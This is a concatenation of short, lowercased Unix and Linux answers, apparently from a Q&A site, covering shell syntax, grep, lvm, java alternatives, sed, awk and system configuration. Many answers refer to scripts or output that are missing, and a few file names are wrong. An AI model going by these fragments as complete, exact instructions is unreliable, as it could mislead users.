mutt has pretty good pgp integration . the wiki shows what settings you need to add to your .muttrc ; these settings may already be present in the system-wide configuration file ( for example , on debian , pgp/gpg works out of the box ) . mutt supports mbox , mh and maildir mailboxes . if you search in a mailbox that happens to contain encrypted mail , you will be prompted for your gpg passphrase ( if you have not already entered it in this session either in mutt or in an external keyring program ) , and mutt will find occurrences in encrypted mails . mutt does not have a command to search multiple mailboxes . if your mails are stored in single files , you can make symbolic links inside a single directory to make a huge mh-format mailbox ; it may be a little slow . also , i have not used it , but notmuch is a recent tool to manage email that supports gpg and is good at indexing , so it should support searches of encrypted mails .
method 1# find networkmanager configuration file and add/modify following entry in centos5 it is in /etc/NetworkManager/nm-system-settings.conf or /etc/NetworkManager/system-connections/ and edit your dsl connection file : [ipv4] method=auto dns=8.8.8.8;4.2.2.2; ignore-auto-dns=true  note:- if [ipv4] not work then try with [ppp] method 2# you can change permission of /etc/resolve.conf so that it can not be write by other service . or you can use chattr method 3# crate a script as mention below in /etc/Networkmanager/dispatcher.d/ and do not forget to make it executable : entry of /etc/resolv.conf.myDNSoverride nameserver 8.8.8.8 
two potential problems : grep -R ( except for the modified gnu grep found on os/x 10.8 and above ) follows symlinks , so even if there is only 100gb of files in ~/Documents , there might still be a symlink to / for instance and you will end up scanning the whole file system including files like /dev/zero . use grep -r with newer gnu grep , or use the standard syntax : find ~/Documents -type f -exec grep Milledgeville /dev/null {} +  ( however note that the exit status will not reflect the fact that the pattern is matched or not ) . grep finds the lines that match the pattern . for that , it has to load one line at a time in memory . gnu grep as opposed to many other grep implementations does not have a limit on the size of the lines it reads and supports search in binary files . so , if you have got a file with a very big line ( that is , with two newline characters very far appart ) , bigger than the available memory , it will fail . that would typically happen with a sparse file . you can reproduce it with : truncate -s200G some-file grep foo some-file  that one is difficult to work around . you could do it as ( still with gnu grep ) : find ~/Documents -type f -exec sh -c 'for i do tr -s "\0" "\\n" &lt; "$i" | grep --label="$i" -He "$0" done' Milledgeville {} +  that converts sequences of nul characters into one newline character prior to feeding the input to grep . that would cover for cases where the problem is due to sparse files . you could optimise it by doing it only for large files : if the files are not sparse and you have a version of gnu grep prior to 2.6 , you can use the --mmap option . the lines will be mmapped in memory as opposed to copied there , which means the system can always reclaim the memory by paging out the pages to the file . that option was removed in gnu grep 2.6
as far as i understand , openvz guests share the host 's kernel and all loaded modules . guests and are not allowed to load modules into the host 's kernel , consequently lsmod shows an empty list . apparently it is not possible to show what modules are loaded into the host 's kernel , without access to the host .
on linux , lvm is a volume management system that uses the kernel device mapper . basically , physical volumes contain metadata that describe how blocks of data on a physical volume should be mapped to create a device mapper block device . lvm is not the only thing that uses the device mapper , you can create mapped volumes manually with dmsetup , luks is another system that uses the device mapper , etc . device mapper devices are given a name . by convention , lvm uses " vg-lv " and have a major and minor device number just like any block device . the device name ( as in what appears in /sys/class/block ) is dm-n where n is the device minor number . for convenience , udev creates a symlink in /dev/mapper with the device mapper name associated with it . and if that device mapper device also happens to be a lvm logical volume , then the lvm subsystem also adds a /dev/vg/lv symlink to it . a similar thing happens for other block devices , where you have /dev/disk/by-id , /dev/disk/by-path . . . for convenience . because the dm-1 , dm-10 . . . may be different for a same device from one boot to the next . it is handy to have a different name that only depends on permanent characteristics of the device ( like the volume name stored in the lvm header ) instead of that minor number which only the kernel cares about .
the syntax would be : filename="${file}_END"  or in your code touch "${file}_END"  the " quotes are not necessary as long as $file does not have any whitespace or globbing character in it .
[ "$var" ] is equivalent to [ -n "$var" ] in bash and most shells nowadays . in other older shells , they are meant to be equivalent , but suffer from different bugs for some special values of "$var " like = ,  or ! . i find [ -n "$var" ] more legible and is the pendant of [ -z "$var" ] . [[ -n $var ]] is the same as [[ $var ]] in all the shells where that non-standard ksh syntax is implemented . test "x$var" != x would be the most reliable if you want to be portable to very old shells .
i recommend you to use apt-file to search for the package that contains a specific file . if you invoke apt-file search listings.sty  you should find the package that contains listings . on my system it is contained in texlive-latex-recommended that you have already installed . to play it safe i would execute texhash  to update latex 's directory tree . if you can not get it working after that i am pretty sure that something else is wrong .
solution : usermod -aG fuse &lt;your-username&gt; reboot 
you might use this syntax which does not require the $ to be escaped unlike your here document attempt . here is a more robust way ( thanks to gilles ' comment suggesting it ) , that has the advantage to allow single quotes to be present in the embedded script : note : there is no way to prevent someone to use a different shell than the one specified with the shebang . writing a portable script ( i.e. . posix ) script does not guarantee it will work with /bin/sh on every platform as the sandard does not mandate the posix shell to use this path .
i am not sure if you will find a single place in kernel sources that will list all kinds of hardware supported : cpu architectures , aux cards , peripheral devices etc . to get a better idea you may construct find commands in the kernel source to get an idea of the types of devices supported . one such place could be to look into the arch directory of your kernel : find /usr/src/kernels/yourkernel/arch -type f -exec grep -i 'supported' {} \; -print  another could be the include directory : find /usr/src/kernels/yourkernel/include -iname "*.h" -exec grep -i 'supported' {} \; -print  and refine/narrow down your search from here . a more efficient approach would be to look into documentation of the system .
the short answer is that it does not . mv is defined to : perform actions equivalent to the rename() function rename() does not copy content , it simply renames it on disk . it is a completely atomic operation that never fails partially complete . that does not tell the whole story , however . where this effect can happen is when trying to move a file between devices : in that case , it is not possible to do the rename in the filesystem . to have the effect of moving , mv first copies the source to the destination , and then deletes the source . in effect , mv /mnt/a/X /mnt/b/Y is essentially equivalent to cp /mnt/a/X /mnt/b/Y &amp;&amp; rm /mnt/a/X . that is the only way moving files between devices could work . when mv does not have permission to delete that source file , an error will be reported , but at that point the copy has already occurred . it is not possible to avoid that by checking the permissions in advance because of possible race conditions where the permissions change during the operation . there is really no way to prevent this possible eventuality , other than making it impossible to move files between devices at all . the choice to allow mv between any source and destination makes things simpler in the general case , at the expense of odd ( but non-destructive ) behaviour in these unusual cases . this is also why moving a large file within a single device is so much faster than moving it to another .
several things might be confusing here . filedescriptors are attached to a file ( in the general sense ) and are specific to a given process . filedescriptors are themselves referred to via numeric ids by their associated process , but one file descriptor can have several ids . example : ids 1 and 2 which are called standard output and standard error usually refers to the same file descriptor . the symlinks /proc/pid/fd/x only provide a hint for what the x filedescriptor of process pid is linked to . if it is a regular file , the symlink gives its path . but if the filedescriptor is e.g. an inet socket , then the symlink is just broken . in the case of a regular file ( or something which has a path like a tty ) , it is possible to open it , but you would obtain a different filedescriptor to the same object .
list-timers arrived with v209 . dump moved to systemd-analyze with v207 . dot moved to systemd-analyze with v198 . all the above came from systemd 's news file .
process substitution was already in the very first release of ksh88 afaik . when it was designed/introduced exactly , we may have to ask david korn , but it probably does not matter , since it probably never came out of bell labs anyway . 99% of bash features come either from the bourne shell , the korn shell , csh , tcsh or zsh . it is always difficult to find out when and where things were introduced especially when considering that many features of ksh were never documented or documented long after they were introduced .
within the same window , you can simply type bash to start a new one . this is equivalent to closing the window and re-opening a new one . alternatively , you can type source ~/.bashrc to source the .bashrc file .
try unloading the sungem kernel module ( after ifconfig eth0 down to release the interface ) . if that works you can blacklist it to avoid it being loaded on next reboot .
indirect rendering means that the glx protocol will be used to transmit opengl commands and the x . org will do the real drawing . direct rendering means that application can access hardware directly without communication with x . org first via mesa . the direct rendering is faster as it does not require change of context into x . org process . clarification : in both cases the rendering is done by gpu ( or technically - may be done by gpu ) . however in indirect rendering the process looks like : program calls a command ( s ) command ( s ) is/are sent to x . org by glx protocol x . org calls hardware ( i.e. . gpu ) to draw in direct rendering program calls a command ( s ) command ( s ) is/are sent to gpu please note that because opengl was designed in such way that may operate over network the indirect rendering is faster then would be naive implementation of architecture i.e. allows to send a buch of commands in one go . however there is some overhead in terms of cpu time spent for context switches and handling protocol .
no you can not , the permission of sysfs is defined in kernel space and can not be changed with userspace tools ( unless with kernel side support ) . but for your own problem , you could setup a sudo entry that allow everyone to write to that path , i.e. ALL ALL = (ALL) NOPASSWD: /usr/bin/tee /sys/class/leds/asus\:\:kbd_backlight/brightness and when you write to that directory , use a script like this , echo 1 | sudo /usr/bin/tee "/sys/class/leds/asus::kbd_backlight/brightness"
it was not a matter of re-hashing passwords at all . all i needed was to modify my old /etc/group so that it has group ids starting with 1000 and the users could log in easily using their old passwords as some commenters have guessed .
if it is in your path , then you can run either type git or which git . the which command has had problems getting the proper path ( confusion between environment and dot files ) . for type , you can get just the path with the -p argument . if it is not in your path , then it is best to look for it with locate -b git it will find anything named ' git ' . it'll be a long list , so might be good to qualify it with locate -b git | fgrep -w bin .
yes , it is definitely possible . you could also share them over the web directly via the nas . to do it from the lamp system , you just need to mount the filesystems on the lamp machine ( likely via nfs ) and configure your webserver ( ftp , ajaxplorer , etc ) to use those mounted directories to serve files . this would basically be the same approach as if you wanted to serve files directly from the lamp machine . this is a fairly common approach , and for a home setup there are not really any caveats , it should just work .
it seems to be related with environment variables . if you set the proxy in your profile ( as environment variables ) , then probably when issuing sudo , these variables do not get loaded . if you succeed doing so with su , then probably you are using su - ( that is the way to load the environment variables of root ) . to get loaded these variables ( for a normal user ) &mdash ; if my assumptions are right&mdash ; you should use the option -E of sudo . you should see the manual of sudo for further details .
you may need to change some things like the grep criteria and the cpu threshold but here it goes : you may change the sleep time , if you wish , too .
this code snippet opens /dev/console . the resulting file descriptor is the lowest-numbered file descriptor that is not already open . if that number is at most 2 , the loop is executed again . if that number is 3 or above , the descriptor is closed and the loop stops . when the loop finishes , file descriptors 0 to 2 ( stdin , stdout and stderr ) are guaranteed to be open . either they were open before , and may be connected to any file , or they have just been opened , and they are connected to /dev/console . the choice of /dev/console is strange . i would have expected /dev/tty , which is always the controlling terminal associated with the process group of the calling process . this is one of the few files that the posix standard requires to exist . /dev/console is the system console , which is where syslog messages sent to the console go ; it is not useful for a shell to care about this .
find . -iname "*.extension" -exec sh -c ' exec &lt;command&gt; "$@" &lt;additional parameters&gt;' sh {} + 
update : found a site that has a pretty good explanation : link from the link : then we have to do some configuration . debian has a script to maintain different version of programs like java called update-alternatives . update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.7.0/bin/java 1065 update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.7.0/bin/javac 1065 where 1065 is a given priority . to check my installation i use \u2013config parameter update-alternatives --config java this prints : There are 2 choices for the alternative java (providing /usr/bin/java). selection path priority status ------------------------------------------------------------ * 0 /usr/lib/jvm/jdk1.7.0/bin/java 1065 auto mode 1 /usr/lib/jvm/java-6-openjdk/jre/bin/java 1061 manual mode 2 /usr/lib/jvm/jdk1.7.0/bin/java 1065 manual mode and because 1065 is higher than 1061 , the fresh installed java 7 will be used by default on my machine java -version prints : java version "1.7.0" java ( tm ) se runtime environment ( build 1.7.0-b147 ) java hotspot ( tm ) 64-bit server vm ( build 21.0-b17 , mixed mode ) notes : this might make it more understandable . sles11 # which java /usr/bin/java sles11 # update-alternatives --list java /usr/lib64/jvm/jre-1.6.0-ibm/bin/java sles11 # update-alternatives --display java java - status is auto . link currently points to /usr/lib64/jvm/jre-1.6.0-ibm/bin/java /usr/lib64/jvm/jre-1.6.0-ibm/bin/java - priority 1608 slave rmiregistry : /usr/lib64/jvm/jre-1.6.0-ibm/bin/rmiregistry slave tnameserv : /usr/lib64/jvm/jre-1.6.0-ibm/bin/tnameserv slave rmid : /usr/lib64/jvm/jre-1.6.0-ibm/bin/rmid slave jre_exports : /usr/lib64/jvm-exports/jre-1.6.0-ibm slave policytool : /usr/lib64/jvm/jre-1.6.0-ibm/bin/policytool slave keytool : /usr/lib64/jvm/jre-1.6.0-ibm/bin/keytool slave jre : /usr/lib64/jvm/jre-1.6.0-ibm current `best ' version is /usr/lib64/jvm/jre-1.6.0-ibm/bin/java . the man page give the path that the update-alternatives uses for its directory . sles11 # pwd /etc/alternatives sles11 # ll lrwxrwxrwx 1 root root 37 mar 19 06:03 java -> /usr/lib64/jvm/jre-1.6.0-ibm/bin/java lrwxrwxrwx 1 root root 28 mar 19 06:03 jre -> /usr/lib64/jvm/jre-1.6.0-ibm lrwxrwxrwx 1 root root 28 mar 19 06:03 jre_1.6.0 -> /usr/lib64/jvm/jre-1.6.0-ibm lrwxrwxrwx 1 root root 36 mar 19 06:03 jre_1.6.0_exports -> /usr/lib64/jvm-exports/jre-1.6.0-ibm lrwxrwxrwx 1 root root 36 mar 19 06:03 jre_exports -> /usr/lib64/jvm-exports/jre-1.6.0-ibm lrwxrwxrwx 1 root root 28 mar 19 06:03 jre_ibm -> /usr/lib64/jvm/jre-1.6.0-ibm lrwxrwxrwx 1 root root 36 mar 19 06:03 jre_ibm_exports -> /usr/lib64/jvm-exports/jre-1.6.0-ibm making the change if you already have them installed and just need to change the default . sles11 # update-alternatives --config java there is only 1 program which provides java ( /usr/lib64/jvm/jre-1.6.0-ibm/bin/java ) . nothing to configure . original answer : if you look in /etc/java or something like /etc/java-7-openjdk you should see the configuration files . java.conf or jvm.cfg this is typically ( depending ) on the configuration file set your options . you can have several version of java installed at the same time and change the startup variables to effect which one is your default jvm . from centos java.conf # if you have the a base jre package installed # ( e . g . java-1.6.0-openjdk ) : #java_home=$jvm_root/jre # if you have the a devel jdk package installed # ( e . g . java-1.6.0-openjdk-devel ) : #java_home=$jvm_root/java from ubuntu jvm.cfg # list of jvms that can be used as an option to java , javac , etc . # order is important -- first in this list is the default jvm . # note that this both this file and its format are unsupported and # will go away in a future release . # # you may also select a jvm in an arbitrary location with the # "-xxaltjvm=" option , but that too is unsupported # and may not be available in a future release . # -server known -client ignore -hotspot error -classic warn -native error -green error -jamvm known -cacao known -zero known -shark aliased_to -zero on ubuntu there is a program called update-java-alternatives this is the top few lines of the man page name update-java-alternatives - update alternatives for jre/sdk installations synopsis update-java-alternatives [ --jre ] [ --plugin ] [ -t|--test|-v|--verbose ] -l|--list [ ] -s|--set -a|--auto -h|- ? |--help description update-java-alternatives updates all alternatives belonging to one runtime or development kit for the java language . a package does provide these information of it is alternatives in /usr/lib/jvm/ . . jinfo . root@ubuntul:/# update-java-alternatives -l java-1.6.0-openjdk 1061 /usr/lib/jvm/java-1.6.0-openjdk -s|--set set all alternatives of the registered jre/sdk installation to the program path provided by the installation . what i will typically also see are links in /etc/profile.d for java startup environments . my guess is that your java libraries were installed in the same place and the config files are still defaulting to the original version . you should just need to give the new jvm path .
you are misunderstanding how brace expansion works . please re-read dennis williamson 's comment above . you are thinking that when i write mv foo.{1,2,3} bar , that the shell is actually invoking the command multiple times , as if you had typed : mv foo.1 bar mv foo.2 bar mv foo.3 bar  if that were true , then your question would make sense : the shell is running multiple commands and so it has to keep a list . but , that is not what is happening . brace expansion expands one single argument then invokes the resulting command line one time . so for the above example , the shell sees that the argument foo.{1,2,3} contains brace expansion and it expands that argument into three arguments foo.1 foo.2 foo.3 . then it inserts that expansion into the command line in place of the braced argument , then it continues parsing the command line . when it is done the shell runs one command , which would look like this : mv foo.1 foo.2 foo.3 bar  so yes , probably when the shell is expanding that braced argument it is keeping a list , but there is no way to access that list in the expansion of other arguments because the brace expansion is fully completed and all information about the expansion is used up and forgotten by the time the other arguments are being parsed . the only way such an argument would be useful , anyway , would be if the shell is running multiple commands which it is not . to run multiple commands you have to use a real loop ; brace expansion will not do that . as for $_ , that is a perl construct that can be used in place of a loop variable ( like x in your loop example ) , so it is not really relevant to brace expansion .
you have multiple '/' charachters inside the ${reply} variable , which is confusing sed . you can choose an alternate delimiter for the s/// command in most versions of sed , so if this were me , i would try something like : sed -i "${1}s|${2}=.*|${2}=${REPLY}|" $3 . this replaces the '/' for sed with '|' , so that the '/' in ${reply} are ( hopefully ) not interpreted by sed .
if you are using a sh-compatible shell ( like bash ) , that &gt; prompt is called the " secondary prompt " . it is set by the value of the PS2 variable , just like PS1 sets the normal prompt . you should be able to change it to # pretty easily : PS2='# '  you might want to put that into your ~/.bashrc ( or whatever the equivalent is for whatever shell you are using ) .
one potential approach would be to put a while...read construct inside your functions which would process any data that came into the function through stdin , operate on it , and then emit the resulting data back out via stdout . function X { while read data; do ...process... done }  care will need to be spent with how you configure your while ..read.. components since they will be highly dependent on the types of data they will be able to reliably consume . there may be an optimal configuration that you can come up with . example here 's each function by itself . $ echo "hi" | logF [F:02/07/14 20:01:11] hi $ echo "hi" | logG G:hi $ echo "hi" | logH H:hi  here they are when we use them together . they can take various styles of input .
the {} just groups commands together in the current shell , while () starts a new subshell . however , what you are doing is putting the grouped commands into the background , which is indeed a new process ; if it was in the current process , it could not possibly be backgrounded . it is easier , imho , to see this kind of thing with strace : note that the bash command starts , then it creates a new child with clone() . using the -f option to strace means it also follows child processes , showing yet another fork ( well , " clone" ) when it runs sleep . if you leave the -f off , you see just the one clone call when it creates the backgrounded process : if you really just want to know how often you are creating new processes , you can simplify that even further by only watching for fork and clone calls :
you need to add both users to a common group , then give that group full access to the shared folder . some systems have a users group for this purpose , so : $ sudo install -d -m 770 -g users /var/ftp/pub/shared  that creates a folder underneath the standard location for the ftp daemon 's /pub directory that any member of group users can write to . ( your ftp setup might have a different parent path . i have not actually tried this on mint to check it . check your ftp daemon 's configuration . ) then you just need to add both peter and john to that users group : $ sudo usermod -a -G users peter $ sudo usermod -a -G users john 
types starting with v are virtual types . that is , there is no corresponding inode on any physical disk but only a vnode in a virtual filesystem ( like /proc ) . it seems those types only belong to bsd-like systems ( aix , darwin , freebsd , hpux , sun etc . ) and will not occur on a linux system . as with the non-virtual types , dir stands for directory and reg for a regular file . i could not find the meaning of gdir and greg as they even do not appear in the lsof source code . but i guess they just stand for the non-virtual ( generic ? ) directories and files .
grep would only find lines matching a pattern in a file , it would not change the file . you could use sed to find the pattern and make changes to the file : sed '/\B\/foobar\b/!d' filename  would display lines matching /foobar in the file . in order to save changes to the file in-place , use the -i option . sed -i '/\B\/foobar\b/!d' filename  you could use it with find too : find . -type f -exec sed -i'' '/\B\/foobar\b/!d' {} \; 
supposing the formatting is always as in example – one value or section delimiter per line : awk '/\{/{s="";i=1}i{s=s"\\n"$0}$1=="value3:"{v=$2}/\}/{if(V==""||V&lt;v){V=v;S=s}i=0}END{print S}' json-like.file  an RS-based alternative , in case not getting the section delimiters is acceptable : awk -vRS='}' '{sub(/.*\{/,"")}match($0,/value3: (\S+)/,m)&amp;&amp;(v==""||v&lt;m[1]){v=m[1];s=$0}END{print s}' json-like.file  an RT-based alternative : awk -vRS='\\{[^{}]+\\}' 'match(RT,/value3: (\S+)/,m)&amp;&amp;(v==""||v&lt;m[1]){v=m[1];s=RT}END{print s}' json-like.file  explanations as requested in comment .
please post your sshd_config something else would seem to be up . a stock centos system always logs to /var/log/secure . example this is controlled through /etc/ssh/sshd_config: # Logging # obsoletes QuietMode and FascistLogging #SyslogFacility AUTH SyslogFacility AUTHPRIV #LogLevel INFO  as well as the contents of /etc/rsyslog.conf: your issue in one of your comments you mentioned that your rsyslogd config file was named /etc/rsyslog.config . that is not the correct name for this file , and is likely the reason your logging is screwed up . change the name of this file to /etc/rsyslog.conf and then restart the logging service . $ sudo service rsyslog restart 
you most certainly can make awk deal with multiple files via wildcards . one suggestion would be to leave the run.awk as a generic " function " that takes a single file in and produces a single output file , and then call it from another script which could then take care of assimilating the input and output files . example this would be a bash script , we can call it , awk_runner.bash . sample run i made a example directory with some test files in it . $ touch file{1..4}.out  this resulted in 4 files being made : $ ls -1 file1.out file2.out file3.out file4.out  now we run our script : after each line that starts with , " running . . . " our script could run from here . files in a list say instead of using the wildcard , *.out we instead had a file with a list of filenames in it , say : $ cat filelist.txt file1.out file2.out file3.out file4.out  we could use this modified version of our script which would use a while loop instead of a for loop . now let 's call this variant of the script , awk_file_runner.bash: this version of the script reads the input from the file , filelist.txt: done &lt; filelist.txt  then for each turn of the while loop , we are using the read command to read in a line from the input file . while read ifname; do  it then performs everything in the same way as the first script where it will run the awk script run.awk as it loops through each line of the file .
the two sides of a pipe are in different processes . you can not share variables between these processes . if you want to share data , you either have to pass it through the pipe , or use alternate communication channels . if you need alternate communication channels , you are above the shell 's capabilities , switch to a real programming language . here , passing lot_url alongside img_url in the second pipe seems like a good solution to me . i would pass them on the same line . assuming your urls are properly escaped , you do not need any particular quoting , you can pass them on the same line . this would have the advantage of allowing a variable number of img_urls in each lot_url .
i can answer for vim , but not emacs . start and end selection in positions outside the text : :set virtualedit=block will enable the behavior you want . you can drop the initial colon and add it to your . vimrc if you like . for more info , :help 'virtualedit' from within vim . paste block inline : if you just hit p in command mode , vim will insert the block , pushing characters to the right on each line . if you select another block and hit p , vim will replace that block with the pasted block . you can paste a block " linewise " with the command-mode key sequence o esc v p . this inserts a line above the current line ( O Esc ) , selects it linewise ( V ) , then pastes over it ( p ) . you could shorten this to ( for example ) y p with a mapping such as :nmap yp O&lt;Esc&gt;Vp -- type that literally ; use five keystrokes for &lt;Esc&gt; rather than pressing the escape key .
find will accept any valid path so find ./dir2 -name '*.c'  should do the trick if the dir directory is /home/user/dir you could give find the full path find /home/user/dir/dir2 -name '*.c' 
i found this python script called smpdf that has this feature . this script is written in german ( some of it ) but it is easy enough to figure out what it is doing and how to use it . it requires pypdf . installation and setup first download the script : svn checkout http://smpdf.googlecode.com/svn/trunk/ smpdf  then download and install pypdf : wget http://pybrary.net/pyPdf/pyPdf-1.13.tar.gz tar zxvf pyPdf-1.13.tar.gz cd pyPdf-1.13 sudo python setup.py install cd ../smpdf  next i downloaded a sample pdf file from example5 . com . specifically this file . usage of smpdf : the sample file we downloaded is as follows : so this sample file has 44 pages and is 386kb in size . using the following command we can split the pdf up into chunk files that are ~0.1mb ( ~100kb ) . python pdfsm.py chunk 0.1 chickering04a.pdf  which produces the following output : our directory now contains the following files : i used this " hacked " command to show the stats of the generated pdf files :
i finally solved the problem , running a query using another tool ( not through ms access or ms excel ) worked massively faster , ended up using daft ( database fishing tool ) to SELECT INTO a text file . processed all 50 million rows in a few hours . it seems the dll driver i was using does not work well with any ms products .
once you are done saving the file , you could always split the file into file pieces or multiple files based on the number of lines . split -l 1000 output_file or even better just try command | split -l 1000 - this will split the output stream into files with each 1000 lines ( default is 1000 lines without -l option ) . the below command will give you additional flexibility to put or enforce a prefix to the filename that will be generated when the output is generated and splitted to store into the file . command | split -l 1000 - small-
this is normal . things placed in sid are targets for release via testing . you can think of it as a " staging " are for testing , which is currently wheezy ( 7.0 ) . the /etc/debian_release file will not change in sid until the base-files packages is updated in preparation for jessie ( 8.0 ) . since debian is in a " freeze " to prepare the release , there will not be much difference between sid and wheezy . only bug fixes will be uploaded to sid until wheezy has released .
it has insert and normal mode ( the insert mode is default , and escape for normal mode ) but no visual mode . in bash : set -o vi you can run it at the command line for just this session or add it to your . bashrc file . many programs use readline for input , and you can make any of them use vi-style keybindings by setting up your .inputrc with set editing-mode vi set keymap vi  in zsh , if you change your EDITOR environment variable , the shell will match it .
try this : in ~/.cshrc put set filec set autolist 
when it is a login shell , bash first looks for ~/.bash_profile . if it does not find it , it looks for ~/.bash_login . if it does not find it , it looks for ~/.profile . in any case , even if the login shell is interactive , bash does not read ~/.bashrc . i recommend to stick to the following content in ~/.bash_profile , and to not have a ~/.bash_login: if [ -e ~/.profile ]; then . ~/.profile; fi case $- in *i* if [ -e ~/.bashrc ]; then . ~/.bashrc; fi;; esac  that way your .profile is loaded whether your login shell is bash or some other sh variant , and your .bashrc is loaded by bash whether the shell is a login shell or not .
these are indeed the process states . processes states that ps indicate are : and the additional characters are :
first find the process id of firefox using the following command in any directory : pidof firefox  kill firefox process using the following command in any directory : kill [firefox pid]  then start firefox again . or you can do the same thing in just one command . as don_crissti said : kill $(pidof firefox) 
that the remote declined to receive the data is only a side effect of the real problem -- git thinks that it was denied because one of the hooks on the remote end failed with an exit status > 0 ( you can see what it was in the ruby traceback ) . it seems that one of the hooks tries to use rake , and can not find it . this is not a problem with your specific repo , probably . that message is also not from your local computer -- notice that it is prefixed with " remote " , it is the remote that is missing rake , so probably only a sysadmin on that side can fix the issue . i would suggest you contact whoever manages your community git repository .
on an elf system , a core file is almost certainly a valid elf file . a platform specific number of " notes " are added to a notes segment so that a debugger can find its way around , e.g. for solaris see core ( 4 ) , and you will note the NT_UTSNAME structure which contains the data structure from the uname(2) syscall . elfdump -n is the way to read that , but as far as i know solaris is the only os that does this ( and i suspect only solaris 11 elfdump works as hoped ) . a simple , though slightly fiddly and not-guaranteed way is to try and fish the HOST or HOSTNAME variables ( set by some startup scripts and shells , bash at least sets HOSTNAME ) out of the core dump environment . you can do this with gdb , though you need the original binary : this prints a chunk of strings from the environ symbol . though it is a horrible hack strings | grep HOSTNAME= just might work too . so , short answer to " is there a way to find out which host generated that core file " is : not easily , and not reliably on linux . fwiw , the relevant coredump code on linux is in fs/binfmt_elf.c , and there is a hook to allow extra " notes " by way of ARCH_HAVE_EXTRA_ELF_NOTES , currently only used on powerpc . ) a better plan altogether is to use sysctl to set the core file name on each client , as suggested by @jlliagre : sysctl kernel.core_pattern="%h-%t-%e.core"  ( sysctl and ferreting around in /proc are equivalent here , i prefer sysctl since changes can be kept documented in /etc/sysctl.conf and it is used on *bsd systems too . )
you can try using apachetop . it shows out output like this :
i do not understand why you are using tac , it does not help you unless you also use grep -m 1 ( assuming gnu grep ) to have grep stop after the first match : tac accounting.log | grep -m 1 foo  from man grep:  -m NUM, --max-count=NUM Stop reading a file after NUM matching lines.  in the example in your question , both tac and grep need to process the entire file so using tac is kind of pointless . so , unless you use grep -m , do not use tac at all , just parse the output of grep to get the last match : grep foo accounting.log | tail -n 1  another approach would be to use perl or any other scripting language . for example ( where $pattern=foo ) : perl -ne '$l=$_ if /foo/; END{print $l}' file  or awk '/foo/{k=$0}END{print k}' file 
as always , the problem was with no finishing the reading of documentation . i needed to actually run networkmanager ( gnome automatically picks it up ) , and disable archlinux 's network daemon . it is all here : https://wiki.archlinux.org/index.php/networkmanager#configuration note : you can start daemon manually by running : sudo /etc/rc.d/networkmanager 
for your first question , you can read it here . for your second question , i am currently using mount --bind .
$PREFIX is ~/.local/ . everything else maps under there .
ok guys , solved it find . -name '*.mp4' -exec exiftool -directory -fileName -imageSize {} \;  first install exiftool .
yes you can , for example you can run following command for installing kde desktop : sudo apt-get install kde-standard  or for full set of package/applications ( it may take a lot of tim ) you can run : sudo apt-get install kde-full  after next login select kde from " session " on the login prompt to start enjoying the kool desktop environment ( kde ) . i recommend if you want to try new desktop , install a fresh one of an specific derivative ( e . g . kubuntu or mint kde ) .
yes , it is intended to run in the guest os . a small balloon module is loaded into the guest os as a pseudo-device driver or kernel service . it has no external interface within the guest , and communicates with esx server via a private channel . when the server wants to reclaim memory , it instructs the driver to inflate'' by allocating pinned physical pages within the VM, using appropriate native interfaces. Similarly, the server maydeflate'' the balloon by instructing it to deallocate previously-allocated pages . ( . . . ) our balloon drivers for the linux , freebsd , and windows operating systems poll the server once per second to obtain a target balloon size , and they limit their allocation rates adaptively to avoid stressing the guest os . http://static.usenix.org/events/osdi02/tech/waldspurger/waldspurger_html/node6.html
after rebooting on the generic slackware kernel i noticed the sdcard was detected as a scsi device - dmesg output follows : the line ENE USB Mass Storage support registered hinted there was something missing related to usb support , so i found this option which was turned off : Device Drivers-&gt;USB Support-&gt;USB ENE card reader support . after recompiling the kernel including this module it was possible to access the sdcard as usual through the associated scsi block device .
i would do it with pdftk . pdftk A=all.pdf cat Aodd output odd.pdf pdftk A=all.pdf cat Aeven output even.pdf 
use ssh-agent and ssh-add all the keys you need to it . example :
if you do not do something special vagrant is a wrapping for virtualbox . you can get a list of running virtualboxes : vboxmanage list runningvms  and parse the output to get a vmname , then do : VBoxManage controlvm &lt;vmname&gt; acpipowerbutton  have to do this as the user that started the vms put a link to the script in /etc/rc0.d and /etc/rc6.d just like other softwares do ( ls /etc/rc0.d /etc/rc6.d ) . my script :
if you use rm -rf stuff_to_delete with a very deep structure then it is possible that there are too many directories for rm to handle . you can work around this with : find /starting/path/to/delete/from -type d -delete or with find -type d /starting/path/to/delete/from -exec rm -f {} \; the first should just work . the second command starts a new command ( rm ) for each directory , but that allows you to use rm 's force flag . i assume it is not needed though and i expect the first command to be faster . regardless of command used , try first with -print to make sure your path is correct .
you have installed a version of libpangocairo-1.0.so.0 in /usr/local/lib that is incompatible with the version in /usr/lib ( probably because they are compiled against different versions of the libraries they depend on ) . if you are no longer using the gnome libraries in /usr/local/lib , remove them . if you are using them for applications that you have installed in /usr/local/bin , either recompile those applications against the library versions in debian , or move the libraries outside the standard library path and use a shell script like this to launch the gnome applications in /usr/local/bin: #!/bin/sh export LD_LIBRARY_PATH=/usr/local/lib/gnome-extra-libraries exec /usr/local/bin/locally-installed-gnome-application.bin  move libpangocairo-1.0.so.0 and its companions to /usr/local/lib/gnome-extra-libraries and move /usr/local/bin/locally-installed-gnome-application to /usr/local/bin/locally-installed-gnome-application.bin .
the easiest way to edit a file from the terminal for a beginner is to use nano . to start nano and open a file : nano path/to/file  when you are in nano , you can use ctrl + g to get help , ctrl + o to save the file and ctrl + x to exit nano . these are listed at the bottom of the screen but with the ^ character for ctrl . this beginner 's guide to nano might be helpful . you can get back to the main install process by pressing left + alt + f1 .
well , if you want to communicate via the serial port you have to setup the right parameters ( baud , stop bit , parity , handshake etc . ) . i used minicom in the past for stuff like using a computer as a serial console terminal to another . the cu command is an alternative .
firstly pkgdesc which is short for package description should be filled out . next , you do not need to have empty array 's . remember the stuff in build is the same as if you were typing it out to build it . you have to run autogen . sh . . . and i could not do that due to some missing gnome dependency ( i run kde ) . you will also notice that ./configure.ac is not executable . . . so how would you execute it ? figure out how to build it by hand and then put that in the build section of the pkgbuild .
